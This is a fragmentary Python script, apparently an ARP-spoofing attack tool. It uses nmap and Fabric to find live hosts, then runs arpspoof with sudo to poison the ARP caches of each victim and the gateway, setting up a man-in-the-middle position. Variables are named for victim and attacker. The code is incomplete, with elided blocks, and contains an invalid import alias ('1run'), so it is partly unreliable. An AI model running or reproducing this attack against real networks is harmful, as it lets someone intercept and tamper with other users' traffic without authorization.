from fabric.operations import local as 1run, run
from fabric.api import hosts, sudo, settings, hide, env, execute
import nmap
import netifaces
import iptools
    ...
    with settings(warn_only=True):
        ...
        # print('{0}:{1}'.format(host, status))
            ...
            if VictimIP != GatewayIP and VictimIP != AttackerIP and VictimIP != AttackerSubnet and VictimIPStat == 'up':
                ...
                sudo('arpspoof -i eth1 -t ' + str(VictimIP) + ' ' + str(GatewayIP))
                # Tell the 'gateway' that we are 'victim'. Open a terminal window and type the below command:
                sudo('arpspoof -i eth1 -t ' + str(GatewayIP) + ' ' + str(VictimIP))